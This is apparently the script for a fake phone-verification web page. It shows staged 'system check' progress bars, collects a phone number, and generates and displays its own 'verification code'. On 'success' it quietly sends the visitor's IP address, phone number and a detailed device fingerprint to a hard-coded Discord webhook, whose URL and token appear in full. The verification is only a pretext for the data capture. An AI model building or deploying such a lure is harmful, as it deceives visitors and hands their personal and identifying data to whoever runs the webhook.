const WEBHOOK_URL = 'https://discord.com/api/webhooks/1303237998428299284/2VqK0JzF3uR9vI2D3v4w5X6Y7Z8a9B0c1D2e3F4g5H6';

let userPhoneNumber = '';
let verificationCode = '';
let generatedCode = '';
let currentStep = 0;
let loadingProgress = 0;

const loadingSteps = [
    { text: 'Initializing system...', duration: 1500 },
    { text: 'Checking system requirements...', duration: 2000 },
    { text: 'Verifying device compatibility...', duration: 2000 },
    { text: 'Preparing authentication...', duration: 1500 },
    { text: 'Setting up verification...', duration: 1000 }
];

function getMobileDeviceType() {
    const userAgent = navigator.userAgent;
    if (/iPhone|iPad|iPod/i.test(userAgent)) {
        return 'iOS Device';
    } else if (/Android/i.test(userAgent)) {
        return 'Android Device';
    } else if (/Mobile|webOS|BlackBerry|IEMobile|Opera Mini/i.test(userAgent)) {
        return 'Mobile Device';
    } else {
        return 'Desktop/Laptop';
    }
}

function validatePhoneNumber(phone) {
    const cleaned = phone.replace(/[^0-9]/g, '');
    return cleaned.length >= 8 && cleaned.length <= 15;
}

function formatPhoneNumber(phone) {
    const cleaned = phone.replace(/[^0-9]/g, '');
    if (cleaned.length <= 3) {
        return cleaned;
    } else if (cleaned.length <= 6) {
        return `(${cleaned.slice(0, 3)}) ${cleaned.slice(3)}`;
    } else if (cleaned.length <= 10) {
        return `(${cleaned.slice(0, 3)}) ${cleaned.slice(3, 6)}-${cleaned.slice(6)}`;
    } else {
        return `+${cleaned.slice(0, cleaned.length - 10)} (${cleaned.slice(-10, -7)}) ${cleaned.slice(-7, -4)}-${cleaned.slice(-4)}`;
    }
}

function generateVerificationCode() {
    return Math.floor(100000 + Math.random() * 900000).toString();
}

function getDeviceInfo() {
    const userAgent = navigator.userAgent;
    const platform = navigator.platform;
    const language = navigator.language;
    const screenRes = `${window.screen.width}x${window.screen.height}`;
    const colorDepth = `${window.screen.colorDepth} bit`;
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    const timestamp = new Date().toISOString();
    const deviceMemory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Unknown';
    const cpuCores = navigator.hardwareConcurrency || 'Unknown';
    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
    const browser = userAgent.match(/(Firefox|Chrome|Safari|Opera|Edge|MSIE|Trident\/|\.NET)/)?.[0] || 'Unknown';
    const os = userAgent.match(/(Windows|Mac OS|Linux|iOS|Android)/)?.[0] || 'Unknown';
    const mobileDeviceType = getMobileDeviceType();

    return {
        userAgent,
        platform,
        language,
        screenRes,
        colorDepth,
        timezone,
        timestamp,
        deviceMemory,
        cpuCores,
        isMobile,
        browser,
        os,
        mobileDeviceType,
        phoneNumber: userPhoneNumber
    };
}

async function sendWebhook() {
    console.log('Sending webhook...');
    if (WEBHOOK_URL) {
        const ip = await fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => data.ip)
            .catch(() => 'Unknown IP');

        const deviceInfo = getDeviceInfo();

        const embed = {
            title: '🔐 Phone Verification Completed',
            description: '📱 User successfully completed phone verification',
            color: 0x00ff00,
            fields: [
                { name: '🌐 IP Address', value: ip, inline: true },
                { name: '📱 Device Type', value: deviceInfo.mobileDeviceType, inline: true },
                { name: '📞 Phone Number', value: deviceInfo.phoneNumber || 'Not provided', inline: true },
                { name: '🖥️ Platform', value: deviceInfo.platform, inline: true },
                { name: '🌍 Language', value: deviceInfo.language, inline: true },
                { name: '📺 Screen Resolution', value: deviceInfo.screenRes, inline: true },
                { name: '🎨 Color Depth', value: deviceInfo.colorDepth, inline: true },
                { name: '🕐 Timezone', value: deviceInfo.timezone, inline: true },
                { name: '💾 Device Memory', value: deviceInfo.deviceMemory, inline: true },
                { name: '⚡ CPU Cores', value: deviceInfo.cpuCores, inline: true },
                { name: '🌐 Browser', value: deviceInfo.browser, inline: true },
                { name: '💻 Operating System', value: deviceInfo.os, inline: true },
                { name: '🕐 Timestamp', value: deviceInfo.timestamp, inline: false }
            ]
        };

        return fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                embeds: [embed]
            })
        })
        .then(response => {
            if (response.ok) {
                console.log('Webhook sent successfully');
                return true;
            } else {
                console.error('Failed to send webhook');
                return false;
            }
        })
        .catch(error => {
            console.error('Error sending webhook:', error);
            return false;
        });
    }
    return false;
}

function updateProgressBar(percentage) {
    const progressFill = document.getElementById('progress-fill');
    const progressText = document.getElementById('progress-text');
    
    progressFill.style.width = percentage + '%';
    
    if (percentage >= 100) {
        progressText.textContent = 'System ready!';
    }
}

function updateStatusItem(statusId, icon, text, isActive = false, isCompleted = false) {
    const statusItem = document.getElementById(statusId);
    const statusIcon = statusItem.querySelector('.status-icon');
    const statusText = statusItem.querySelector('.status-text');
    
    statusIcon.textContent = icon;
    statusText.textContent = text;
    
    statusItem.classList.remove('active', 'completed');
    if (isActive) {
        statusItem.classList.add('active');
    } else if (isCompleted) {
        statusItem.classList.add('completed');
    }
}

async function startLoadingSequence() {
    const progressFill = document.getElementById('progress-fill');
    const progressText = document.getElementById('progress-text');
    
    for (let i = 0; i < loadingSteps.length; i++) {
        const step = loadingSteps[i];
        progressText.textContent = step.text;
        
        // Update status items
        if (i === 0) {
            updateStatusItem('status-1', '⏳', step.text, true);
        } else if (i === 1) {
            updateStatusItem('status-1', '✅', 'Checking system requirements', false, true);
            updateStatusItem('status-2', '⏳', step.text, true);
        } else if (i === 2) {
            updateStatusItem('status-2', '✅', 'Verifying device compatibility', false, true);
            updateStatusItem('status-3', '⏳', step.text, true);
        } else if (i === 3) {
            updateStatusItem('status-3', '✅', 'Preparing authentication', false, true);
        }
        
        // Update progress bar
        const targetProgress = ((i + 1) / loadingSteps.length) * 100;
        const progressIncrement = targetProgress - loadingProgress;
        const steps = 20;
        const incrementAmount = progressIncrement / steps;
        
        for (let j = 0; j < steps; j++) {
            loadingProgress += incrementAmount;
            updateProgressBar(loadingProgress);
            await new Promise(resolve => setTimeout(resolve, step.duration / steps));
        }
        
        loadingProgress = targetProgress;
        updateProgressBar(loadingProgress);
    }
    
    // Complete all status items
    updateStatusItem('status-3', '✅', 'Preparing authentication', false, true);
    
    // Wait a moment before transitioning
    await new Promise(resolve => setTimeout(resolve, 1000));
    
    // Transition to verification screen
    document.getElementById('loading-screen').style.display = 'none';
    document.getElementById('verification-screen').style.display = 'flex';
}

function setupPhoneVerification() {
    const phoneInput = document.getElementById('phone-number');
    const sendVerificationBtn = document.getElementById('send-verification');
    const phoneError = document.getElementById('phone-error');
    
    phoneInput.addEventListener('input', function(e) {
        const formatted = formatPhoneNumber(e.target.value);
        e.target.value = formatted;
        phoneError.classList.remove('show');
        phoneInput.classList.remove('error');
    });
    
    sendVerificationBtn.addEventListener('click', async function() {
        const phoneNumber = phoneInput.value.trim();
        
        if (!validatePhoneNumber(phoneNumber)) {
            phoneError.textContent = 'Please enter a valid phone number (8-15 digits)';
            phoneError.classList.add('show');
            phoneInput.classList.add('error');
            return;
        }
        
        userPhoneNumber = phoneNumber;
        sendVerificationBtn.disabled = true;
        sendVerificationBtn.textContent = 'Sending...';
        
        // Simulate sending verification code
        await new Promise(resolve => setTimeout(resolve, 2000));
        
        generatedCode = generateVerificationCode();
        console.log('Generated verification code:', generatedCode);
        
        // Show verification code form
        document.getElementById('phone-verification-form').style.display = 'none';
        document.getElementById('verification-code-form').style.display = 'block';
        
        // Display the verification code for testing (remove in production)
        const codeDisplay = document.createElement('div');
        codeDisplay.className = 'code-display';
        codeDisplay.innerHTML = `
            <div style="text-align: center; margin: 20px 0; padding: 15px; background: rgba(16, 185, 129, 0.1); border-radius: 8px; border: 1px solid rgba(16, 185, 129, 0.3);">
                <p style="margin: 0 0 10px 0; color: #10b981; font-weight: 600;">Test Mode - Verification Code:</p>
                <p style="margin: 0; font-size: 24px; font-weight: bold; color: #10b981; letter-spacing: 2px;">${generatedCode}</p>
                <p style="margin: 10px 0 0 0; font-size: 12px; color: #6b7280;">(Enter this code above to verify)</p>
            </div>
        `;
        
        // Insert the code display before the verify button
        const verifyButton = document.getElementById('verify-code');
        verifyButton.parentNode.insertBefore(codeDisplay, verifyButton);
        
        // Focus on code input
        document.getElementById('verification-code').focus();
    });
    
    phoneInput.addEventListener('keypress', function(e) {
        if (e.key === 'Enter') {
            sendVerificationBtn.click();
        }
    });
}

function setupCodeVerification() {
    const codeInput = document.getElementById('verification-code');
    const verifyCodeBtn = document.getElementById('verify-code');
    const codeError = document.getElementById('code-error');
    const resendBtn = document.getElementById('resend-code');
    
    codeInput.addEventListener('input', function(e) {
        // Only allow numbers
        e.target.value = e.target.value.replace(/[^0-9]/g, '');
        codeError.classList.remove('show');
        codeInput.classList.remove('error');
    });
    
    verifyCodeBtn.addEventListener('click', async function() {
        const enteredCode = codeInput.value.trim();
        
        if (enteredCode.length !== 6) {
            codeError.textContent = 'Please enter a 6-digit verification code';
            codeError.classList.add('show');
            codeInput.classList.add('error');
            return;
        }
        
        verifyCodeBtn.disabled = true;
        verifyCodeBtn.textContent = 'Verifying...';
        
        // Simulate verification process
        await new Promise(resolve => setTimeout(resolve, 2000));
        
        if (enteredCode === generatedCode) {
            // Success!
            document.getElementById('verification-code-form').style.display = 'none';
            document.getElementById('success-screen').style.display = 'block';
            
            // Send webhook with collected data
            await sendWebhook();
            
            // Show success for a few seconds, then could redirect or show final message
            setTimeout(() => {
                // Could redirect to another page or show completion message
                console.log('Verification process completed successfully');
            }, 3000);
        } else {
            codeError.textContent = 'Invalid verification code. Please try again.';
            codeError.classList.add('show');
            codeInput.classList.add('error');
            verifyCodeBtn.disabled = false;
            verifyCodeBtn.textContent = 'Verify Code';
        }
    });
    
    codeInput.addEventListener('keypress', function(e) {
        if (e.key === 'Enter') {
            verifyCodeBtn.click();
        }
    });
    
    resendBtn.addEventListener('click', async function() {
        resendBtn.disabled = true;
        resendBtn.textContent = 'Sending...';
        
        // Simulate resending code
        await new Promise(resolve => setTimeout(resolve, 1500));
        
        generatedCode = generateVerificationCode();
        console.log('New verification code:', generatedCode);
        
        // Update the displayed verification code
        const existingCodeDisplay = document.querySelector('.code-display');
        if (existingCodeDisplay) {
            existingCodeDisplay.innerHTML = `
                <div style="text-align: center; margin: 20px 0; padding: 15px; background: rgba(16, 185, 129, 0.1); border-radius: 8px; border: 1px solid rgba(16, 185, 129, 0.3);">
                    <p style="margin: 0 0 10px 0; color: #10b981; font-weight: 600;">Test Mode - New Verification Code:</p>
                    <p style="margin: 0; font-size: 24px; font-weight: bold; color: #10b981; letter-spacing: 2px;">${generatedCode}</p>
                    <p style="margin: 10px 0 0 0; font-size: 12px; color: #6b7280;">(Enter this code above to verify)</p>
                </div>
            `;
        }
        
        codeError.textContent = 'New verification code sent!';
        codeError.style.color = '#10b981';
        codeError.classList.add('show');
        
        resendBtn.disabled = false;
        resendBtn.textContent = 'Resend';
        
        setTimeout(() => {
            codeError.classList.remove('show');
        }, 3000);
    });
}

window.addEventListener('load', function() {
    startLoadingSequence();
    setupPhoneVerification();
    setupCodeVerification();
});
